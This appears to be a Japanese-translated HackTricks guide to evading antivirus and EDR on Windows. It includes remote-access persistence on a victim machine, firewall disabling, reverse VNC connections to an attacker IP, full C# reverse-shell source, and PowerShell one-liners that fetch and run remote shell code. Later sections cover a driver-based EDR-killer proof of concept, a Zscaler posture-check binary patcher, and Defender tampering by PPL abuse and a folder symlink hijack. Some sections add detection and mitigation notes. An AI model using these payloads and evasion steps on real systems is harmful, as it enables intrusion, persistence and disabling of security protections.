[**このブログ記事**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) にあるように、被害者のPCにChrome Remote Desktopを展開してそれを使って乗っ取り、持続化を確立するのは簡単です:
1. https://remotedesktop.google.com/ からダウンロードし、"Set up via SSH" をクリックして、Windows用のMSIファイルをダウンロードします。
2. 被害者のPCで（管理者権限が必要）インストーラをサイレント実行します: `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktopのページに戻り、Nextをクリックします。ウィザードが承認を求めるので、Authorizeボタンをクリックして続行します。
4. 少し調整した上で指定されたパラメータを実行します: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（GUIを使わずにPINを設定できる点に注意）

## Advanced Evasion

Evasionは非常に複雑なテーマで、1台のシステム内でも多くの異なるテレメトリソースを考慮する必要があるため、成熟した環境で完全に検出されないようにするのはほぼ不可能です。

対峙する環境ごとに強みと弱みが異なります。

より高度なEvasion手法の導入として、[@ATTL4S](https://twitter.com/DaniLJ94) のこのトークを見ることを強くお勧めします。

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

これは [@mariuszbit](https://twitter.com/mariuszbit) による Evasion in Depth の別の素晴らしいトークです。

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) を使うと、バイナリの一部を順に**削除**していき、どの部分をDefenderが悪意あると判断しているかを特定して分割してくれます。\
同様のことを行う別のツールは [**avred**](https://github.com/dobin/avred) で、サービスを公開しているウェブは [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) です。

### **Telnet Server**

Windows10以前のすべてのWindowsには、管理者として次の操作を行うことでインストールできる**Telnet server**が付属していました：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
システム起動時にそれを**start**させ、今すぐ**run**してください:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet port を変更** (stealth) および firewall を無効化する:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin downloads を選んでください。setup ではありません)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- オプション _Disable TrayIcon_ を有効にする
- _VNC Password_ にパスワードを設定する
- _View-Only Password_ にパスワードを設定する

Then, move the binary _**winvnc.exe**_ and **newly** created file _**UltraVNC.ini**_ inside the **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** ステルス性を維持するため、以下のことは行ってはいけない

- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCTの内部:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
次に **start the lister** を `msfconsole -r file.rc` で起動し、**execute** the **xml payload** with:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**現在の defender はプロセスを非常に速く終了します。**

### 自前の reverse shell をコンパイルする

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初の C# Revershell

次のコマンドでコンパイル:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
以下と一緒に使用：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using コンパイラ
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# の難読化ツール一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### pythonを使用した build injectors の例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### その他

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – カーネル空間からAV/EDRを無効化する

Storm-2603は、小さなコンソールユーティリティである **Antivirus Terminator** を利用して、ランサムウェア投入前にエンドポイント保護を無効化しました。ツールは **own vulnerable but *signed* driver** を持ち込み、Protected-Process-Light (PPL) のAVサービスでさえブロックできない特権的なカーネル操作を悪用します。

主なポイント
1. 署名済みドライバ: ディスクに配置されるファイルは `ServiceMouse.sys` ですが、実際のバイナリは Antiy Labs の “System In-Depth Analysis Toolkit” に含まれる正当に署名されたドライバ `AToolsKrnl64.sys` です。ドライバが有効な Microsoft 署名を持つため、Driver-Signature-Enforcement (DSE) が有効でもロードされます。
2. サービスのインストール:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
最初の行はドライバを **kernel service** として登録し、二行目で起動するため `\\.\ServiceMouse` がユーザーランドからアクセス可能になります。
3. ドライバが公開する IOCTLs
| IOCTL code | 機能 |
|-----------:|-----------------------------------------|
| `0x99000050` | PID で任意のプロセスを終了（Defender/EDR サービスを停止するために使用） |
| `0x990000D0` | ディスク上の任意のファイルを削除 |
| `0x990001D0` | ドライバをアンロードしサービスを削除 |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. なぜ動作するのか: BYOVD はユーザーモードの保護を完全に回避します。カーネルで実行されるコードは *protected* なプロセスを開いたり終了させたり、PPL/PP、ELAM、その他のハードニング機能に関係なくカーネルオブジェクトを改変できます。

検出 / 緩和策
• Microsoft の脆弱ドライバブロックリスト（`HVCI`、`Smart App Control`）を有効にして、Windows が `AToolsKrnl64.sys` のロードを拒否するようにする。  
• 新しい *kernel* サービスの作成を監視し、ドライバがワールドライト可能なディレクトリからロードされたり許可リストに存在しない場合はアラートを出す。  
• カスタムデバイスオブジェクトへのユーザーモードハンドルと、その後に続く疑わしい `DeviceIoControl` 呼び出しを監視する。

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler の **Client Connector** はデバイスポスチャルールをローカルで適用し、結果を他のコンポーネントに伝えるために Windows RPC に依存しています。完全なバイパスを可能にする弱い設計判断が2つあります:

1. Posture の評価は **完全にクライアント側で** 行われる（サーバーには boolean が送信される）。  
2. 内部 RPC エンドポイントは接続してくる実行ファイルが **signed by Zscaler** であること（`WinVerifyTrust` 経由）だけを検証する。

ディスク上の4つの署名済みバイナリを**パッチする**ことで、両方の仕組みを無効化できます:

| バイナリ | 元のロジック | 結果 |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を返すため、すべてのチェックが適合と判定される |
| `ZSAService.exe` | 間接的に `WinVerifyTrust` を呼ぶ | NOP 化 ⇒ （未署名を含む）任意のプロセスが RPC パイプにバインドできる |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置換される |
| `ZSATunnel.exe` | トンネルに対する整合性チェック | ショートサーキット（無効化） |

最小パッチャー抜粋:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
元のファイルを差し替え、サービススタックを再起動した後:

* **All** posture checks が **green/compliant** と表示される。
* 署名されていない、または改変されたバイナリが named-pipe RPC エンドポイントを開くことができる（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 侵害されたホストは Zscaler ポリシーで定義された内部ネットワークへ制限なくアクセスできるようになる。

このケーススタディは、純粋にクライアント側の信頼判断と単純な署名チェックが、数バイトのパッチでどのように破られるかを示している。

## Protected Process Light (PPL) を悪用して LOLBINs で AV/EDR を改ざんする

Protected Process Light (PPL) は署名者／レベルの階層を強制し、同等以上の保護レベルを持つプロセスだけが互いに改ざんできるようにする。攻撃側からは、正規に PPL 対応バイナリを起動し引数を制御できれば、ログ出力などの無害な機能を AV/EDR が利用する保護ディレクトリに対する制約付きの、PPL バックドの書き込みプリミティブに変えることができる。

What makes a process run as PPL
- ターゲットの EXE（およびロードされる DLL）が PPL 対応の EKU で署名されている必要がある。
- プロセスは CreateProcess を使って、フラグ: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` を指定して作成される必要がある。
- バイナリの署名者に合致する互換な保護レベルを要求する必要がある（例: `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` はアンチマルウェア署名用、`PROTECTION_LEVEL_WINDOWS` は Windows 署名用）。誤ったレベルだと作成時に失敗する。

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 署名されたシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自身でプロセスを生成し、呼び出し元が指定したパスにログファイルを書き込むパラメータを受け取ります。
- PPLプロセスとして起動されると、ファイル書き込みはPPLの保護下で行われます。
- ClipUpはスペースを含むパスを解析できないため、通常保護されている場所を指すには8.3短縮パスを使用してください。

8.3 short path helpers
- 短縮名を一覧表示するには: `dir /x` を各親ディレクトリで実行します。
- cmdで短縮パスを導出するには: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL対応のLOLBIN（ClipUp）をランチャー（例: CreateProcessAsPPL）を使って `CREATE_PROTECTED_PROCESS` で起動する。
2) ClipUpのログパス引数を渡し、保護されたAVディレクトリ（例: Defender Platform）にファイル作成を強制する。必要なら8.3短縮名を使う。
3) 対象バイナリが通常実行中にAVによって開かれて/ロックされている場合（例: MsMpEng.exe）、AVが起動する前にブート時に書き込みを行うよう、より早く確実に実行される自動起動サービスをインストールしてスケジュールする。Process Monitor（boot logging）でブート順序を検証する。
4) 再起動時にPPL保護された書き込みがAVがバイナリをロックする前に実行され、対象ファイルを破損させて起動を妨げる。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
注意事項と制約
- ClipUp が書き込む内容は配置以外で制御できない；プリミティブは精密なコンテンツ注入というより改ざん向けである。
- サービスのインストール/起動にはローカル管理者/SYSTEM 権限と再起動の余地が必要。
- タイミングが重要：対象は開かれていてはならない；ブート時実行はファイルロックを回避する。

検知
- 起動周辺で、特に非標準のランチャーを親に持つような、異常な引数での `ClipUp.exe` のプロセス生成。
- 自動起動に設定された疑わしいバイナリの新規サービスや、常に Defender/AV より先に開始されるケース。Defender の起動失敗に先行するサービス作成/変更を調査する。
- Defender のバイナリや Platform ディレクトリに対するファイル整合性監視；protected-process フラグを持つプロセスによる予期しないファイル作成/変更。
- ETW/EDR テレメトリ：`CREATE_PROTECTED_PROCESS` で作成されたプロセスや、非 AV バイナリによる異常な PPL レベルの使用を検出する。

緩和策
- WDAC/Code Integrity：どの署名済みバイナリが PPL として、どの親プロセス下で実行できるかを制限する。正当なコンテキスト外での ClipUp 呼び出しをブロックする。
- サービスの衛生管理：自動起動サービスの作成/変更を制限し、起動順操作を監視する。
- Defender のタンパ保護と早期起動保護が有効になっていることを確認する；バイナリ破損を示す起動エラーを調査する。
- 環境が許容する場合、セキュリティツールをホストするボリュームで 8.3 短い名前生成を無効にすることを検討する（十分にテストすること）。

PPL とツールに関する参考資料
- Microsoft Protected Processes の概要: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU 参照: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon のブートログ（順序検証）: https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL ランチャー: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.

前提条件
- ローカル管理者（Platform フォルダ下でディレクトリ/シンボリックリンクを作成するために必要）
- 再起動や Defender のプラットフォーム再選択を引き起こす能力（ブート時のサービス再起動）
- 組み込みツールのみで実行可能（mklink）

なぜ機能するか
- Defender は自身のフォルダへの書き込みをブロックするが、プラットフォーム選択はディレクトリエントリを信頼し、ターゲットが保護/信頼されたパスに解決されるかを検証せずに辞書順で最大のバージョンを選択する。

ステップバイステップ（例）
1) 現在の platform フォルダの書き込み可能なクローンを用意する（例：`C:\TMP\AV`）:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内にあなたのフォルダを指す、より高いバージョンのディレクトリ symlink を作成します:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガー選択（再起動を推奨）:
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクトされたパスから実行されていることを確認:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
新しいプロセスパスが `C:\TMP\AV\` 以下に移動していること、そしてサービスの構成／レジストリがその場所を反映していることを確認してください。

Post-exploitation options
- DLL sideloading/code execution: DefenderがアプリケーションディレクトリからロードするDLLを配置または差し替えて、Defenderのプロセス内でコードを実行します。上のセクションを参照: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlinkを削除しておくと、次回起動時に設定されたパスが解決できず、Defenderが起動に失敗します:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> この手法単体では privilege escalation を提供しません。admin rights が必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams は、C2 implant からランタイム回避を移動させ、Import Address Table (IAT) をフックして選択した APIs を attacker-controlled な position‑independent code (PIC) 経由でルーティングすることでターゲットモジュール自体に回避機構を組み込めます。これは多くの kit が露出する小さな API サーフェス（例: CreateProcessA）を超えて回避を一般化し、BOFs や post‑exploitation DLLs に同じ保護を拡張します。

High-level approach
- Reflective loader（prepended または companion）を使ってターゲットモジュールに並べて PIC blob を配置します。PIC は自己完結かつ position‑independent でなければなりません。
- ホスト DLL がロードされる際にその IMAGE_IMPORT_DESCRIPTOR を走査し、対象の imports（例: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc）に対する IAT エントリを薄い PIC ラッパーを指すようにパッチします。
- 各 PIC ラッパーは実際の API アドレスに tail‑call する前に回避処理を実行します。典型的な回避には次が含まれます:
  - 呼び出し前後でのメモリマスク／アンマスク（例: beacon 領域を暗号化、RWX→RX、ページ名／権限の変更）して呼び出し後に復元。
  - Call‑stack spoofing: 無害なスタックを構築しターゲット API に遷移させることで call‑stack 分析が期待されるフレームを解決するようにする。
- 互換性のためにインターフェイスをエクスポートし、Aggressor script（または同等のもの）が Beacon、BOFs、post‑ex DLLs のどの APIs をフックするかを登録できるようにします。

Why IAT hooking here
- フックされた import を使う任意のコードで動作するため、ツールコードを変更したり Beacon に特定の APIs をプロキシさせることに依存しません。
- post‑ex DLLs をカバーします: LoadLibrary* をフックすればモジュールロード（例: System.Management.Automation.dll, clr.dll）を傍受し、それらの API 呼び出しにも同じマスキング／スタック回避を適用できます。
- CreateProcessA/W をラップすることで call‑stack ベースの検出に対するプロセス生成系の post‑ex コマンドの信頼できる利用を復元します。

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
注意事項
- リロケーション/ASLRの処理後、importの最初の使用前にパッチを適用すること。Reflective loaders like TitanLdr/AceLdrは、ロードされたモジュールのDllMainの間にフックを行うことを示している。
- ラッパーは小さくPIC-safeに保つこと；真のAPIは、パッチ適用前に取得した元のIAT値、またはLdrGetProcedureAddress経由で解決する。
- PICについてはRW → RXの遷移を使用し、書き込み可能かつ実行可能なページを残さないようにする。

Call‑stack spoofing stub
- Draugr‑style PIC stubsは偽のコールチェーン（無害なモジュールへのリターンアドレス）を構築し、その後実際のAPIへピボットする。
- これはBeacon/BOFsから敏感なAPIへの正規のスタックを期待する検出を回避する。
- APIプロローグの前に期待されるフレーム内に到達させるため、stack cutting/stack stitching技術と組み合わせる。

Operational integration
- Reflective loaderをpost‑ex DLLsに前置して、DLLがロードされた際にPICとフックが自動的に初期化されるようにする。
- Aggressorスクリプトを使いターゲットAPIを登録することで、BeaconやBOFsがコード変更なしに同じ回避経路の恩恵を透過的に受けられるようにする。

Detection/DFIR considerations
- IAT integrity：non‑image（heap/anon）アドレスに解決されるエントリ；インポートポインタの定期的な検証。
- Stack anomalies：ロードされたイメージに属さないリターンアドレス；non‑image PICへの急激な遷移；一貫性のないRtlUserThreadStartの祖先関係。
- Loader telemetry：プロセス内でのIATへの書き込み、早期のDllMainアクティビティでimport thunksを変更する動作、ロード時に作られる予期しないRX領域。
- Image‑load evasion：もしLoadLibrary*をフックしている場合、memory maskingイベントと相関するautomation/clrアセンブリの疑わしいロードを監視する。

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
